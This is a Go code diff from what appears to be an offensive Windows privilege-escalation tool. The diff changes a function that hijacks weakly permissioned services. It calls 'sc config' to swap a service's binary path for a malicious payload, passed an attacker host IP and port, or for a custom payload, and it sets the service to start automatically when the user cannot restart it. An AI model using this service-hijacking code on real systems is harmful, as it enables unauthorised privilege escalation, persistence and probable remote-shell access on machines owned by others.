@@ -19,6 +19,7 @@ func ChangeBinPath(serv *WeakServ, choice int, m *MenuColors) *WeakServ {
 	homeDir = strings.ToLower(strings.Replace(homeDir, `\`, `/`, -1))
 
 	var cmdFormat string
+	var startAuto bool
 
 	switch choice {
 	case 1:
@@ -49,6 +50,8 @@ func ChangeBinPath(serv *WeakServ, choice int, m *MenuColors) *WeakServ {
 			m.CD.Println("Insufficient permissions to start and stop this service.")
 			m.CD.Println("Setting START_TYPE to AUTO")
 			cmdFormat = fmt.Sprintf(`start=auto binpath=%s %s %s`, malPath, hostIP, hostPort)
+			startAuto = true
+
 		}
 
 		cmd := exec.Command("sc", "config", serv.Name, cmdFormat)
@@ -59,11 +62,14 @@ func ChangeBinPath(serv *WeakServ, choice int, m *MenuColors) *WeakServ {
 			m.CD.Printf("Error changing binary path for service: %s: %v\n", serv.Name, err)
 		} else {
 			m.CD.Printf("Changed binary path for service: %s succesfully\n", serv.Name)
-			serv.BinPath = malPath
+			serv.BinPath = malPath + " " + hostIP + " " + hostPort
+			if startAuto {
+				serv.StartMode = "AUTO_START"
+			}
 		}
 
 	case 2:
-		var customBin, cmdFormat string
+		var customBin string
 
 		m.CD.Println("Please enter FULL path of your custom payload:")
 
@@ -81,10 +87,11 @@ func ChangeBinPath(serv *WeakServ, choice int, m *MenuColors) *WeakServ {
 			m.CD.Println("Insufficient permissions to start and stop this service.")
 			m.CD.Println("Setting START_TYPE to AUTO")
 			cmdFormat = fmt.Sprintf(`start=auto binpath="%s"`, customBin)
+			startAuto = true
 
 		}
 
-		cmd := exec.Command("sc", "config", serv.Name, "start=auto", cmdFormat)
+		cmd := exec.Command("sc", "config", serv.Name, cmdFormat)
 
 		err = cmd.Run()
 
@@ -93,6 +100,10 @@ func ChangeBinPath(serv *WeakServ, choice int, m *MenuColors) *WeakServ {
 		} else {
 			m.CD.Printf("Changed binary path for service: %s succesfully\n", serv.Name)
 			serv.BinPath = customBin
+
+			if startAuto {
+				serv.StartMode = "AUTO_START"
+			}
 		}
 
 	}
